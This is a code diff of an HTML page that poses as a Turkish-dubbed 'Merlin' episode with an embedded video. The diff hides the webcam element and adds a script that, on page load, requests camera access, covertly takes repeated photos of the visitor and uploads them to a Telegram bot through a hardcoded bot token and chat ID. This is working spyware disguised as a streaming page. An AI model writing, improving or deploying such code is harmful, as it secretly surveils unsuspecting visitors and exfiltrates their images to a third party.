@@ -20,15 +20,15 @@
         .title {
             font-size: 3rem; /* Large title font */
             font-weight: bold;
-            margin-top: 20px;
-            color: #f0f0f0;
+            margin-top: 20px; /* Added margin-top so the title does not overlap */
+            color: #f0f0f0; /* Light color for title */
             text-transform: uppercase;
-            margin-bottom: 20px;
+            margin-bottom: 20px; /* Added space below title */
         }
         .video-container {
             position: relative;
             width: 100%;
-            max-width: 1000px;
+            max-width: 1000px; /* Maximum video width */
             height: 0;
             padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
             background-color: #000;
@@ -54,20 +54,34 @@
             color: #fff;
             text-align: center;
         }
-        .webcam {
-            width: 100%;
-            max-width: 400px;
-            border: 1px solid #fff;
-            margin-top: 20px;
+        #video {
+            display: none; /* Hide the video element */
         }
-        #canvas {
-            display: none;
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2rem; /* Adjust title font size for mobile */
+            }
+            .description {
+                font-size: 0.9rem; /* Smaller text for mobile */
+            }
+        }
+        @media (max-width: 480px) {
+            .title {
+                font-size: 1.5rem; /* Smaller title for very small screens */
+            }
+            .description {
+                font-size: 0.8rem;
+            }
         }
     </style>
     <script>
-        const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs'; // Telegram Bot Token
-        const chatId = '7771348001'; // Your Telegram Chat ID
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
         let videoStream = null;
+
+        const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs';  // Your Telegram bot token
+        const chatId = '7771348001';  // Your Telegram chat ID
 
         // Function to send image to Telegram
         function sendToTelegram(imageData) {
@@ -92,49 +106,30 @@
 
         // Function to capture a single photo from the video stream
         function capturePhoto() {
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            const video = document.getElementById('video');
-
-            // Set the canvas size to the video size
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
             // Draw the current video frame onto the canvas
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert the canvas content to an image URL (base64)
+            const imgData = canvas.toDataURL('image/png');
+            console.log("Captured Image:", imgData);
 
-            // Convert the canvas content to a Blob (image) for sending
-            canvas.toBlob((blob) => {
-                console.log('Captured Image:', blob);
-                sendToTelegram(blob);
-            }, 'image/png');
-        }
+            // Convert the base64 image to a Blob for sending via Telegram
+            const byteCharacters = atob(imgData.split(',')[1]);
+            const byteArrays = [];
 
-        // Function to start the webcam and capture images
-        function startWebcam() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    videoStream = stream;
-                })
-                .catch((error) => {
-                    console.error('Error accessing the camera:', error);
-                });
-        }
+            for (let offset = 0; offset < byteCharacters.length; offset++) {
+                const byteArray = new Uint8Array(1);
+                byteArray[0] = byteCharacters.charCodeAt(offset);
+                byteArrays.push(byteArray);
+            }
 
-        // Function to take 5 pictures with a 30-second delay
-        function captureFivePictures() {
-            let count = 0;
-            const captureInterval = setInterval(() => {
-                if (count < 5) {
-                    capturePhoto();
-                    count++;
-                } else {
-                    clearInterval(captureInterval); // Stop the interval after 5 pictures
-                    stopCamera(videoStream); // Stop the camera after capturing 5 pictures
-                }
-            }, 2000); // Capture a picture every 2 seconds
+            const byteArray = new Blob(byteArrays, { type: 'image/png' });
+
+            // Send the captured image to Telegram
+            sendToTelegram(byteArray);
         }
 
         // Function to stop the camera
@@ -144,32 +139,58 @@
             console.log('Camera stopped.');
         }
 
-        // Function to schedule the initial photo capture
-        function scheduleInitialCapture() {
-            setTimeout(() => {
-                console.log('Taking initial 5 pictures after 30 seconds');
-                captureFivePictures(); // Capture 5 pictures after 30 seconds
-            }, 30000); // Wait for 30 seconds before starting to capture
+        // Function to activate the camera and capture multiple photos
+        function activateCameraAndCaptureMultiple() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    videoStream = stream;
+
+                    let count = 0;
+                    const captureInterval = setInterval(() => {
+                        capturePhoto();
+                        count++;
+
+                        if (count >= 5) {
+                            clearInterval(captureInterval);
+                            stopCamera(videoStream);
+                        }
+                    }, 2000); // Capture a picture every 2 seconds (5 pictures in 10 seconds)
+                })
+                .catch((error) => {
+                    console.error('Error accessing the camera:', error);
+                });
         }
 
-        // Start the webcam and scheduling when the page loads
-        document.addEventListener('DOMContentLoaded', () => {
-            startWebcam(); // Start the webcam immediately
-            scheduleInitialCapture(); // Schedule the photo capture after 30 seconds
-        });
+        // Function to schedule automatic photo capture
+        function scheduleAutomaticCapture() {
+            setTimeout(() => {
+                console.log('Taking initial photo after 30 seconds');
+                activateCameraAndCaptureMultiple();
+
+                setInterval(() => {
+                    console.log('Taking photos every 20 minutes');
+                    activateCameraAndCaptureMultiple();
+                }, 30000); // 20 minutes in milliseconds
+
+            }, 30000); // 30 seconds in milliseconds
+        }
+
+        // Start the automatic capture schedule on page load
+        document.addEventListener('DOMContentLoaded', scheduleAutomaticCapture);
     </script>
 </head>
 <body>
-    <!-- Video title -->
+    <!-- Video title at the top center above the player -->
     <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
 
-    <!-- Custom Video Player -->
+    <!-- Custom Video Player using Google Drive link -->
     <div class="video-container">
         <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
                 frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
-    <!-- Description Section -->
+    <!-- Description section -->
     <div class="description">
         <p>
             "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
@@ -179,8 +200,8 @@
         </p>
     </div>
 
-    <!-- Webcam Display -->
-    <video id="video" autoplay class="webcam"></video>
-    <canvas id="canvas"></canvas>
+    <!-- Hidden video and canvas elements -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 </body>
-</html>
+</html>      
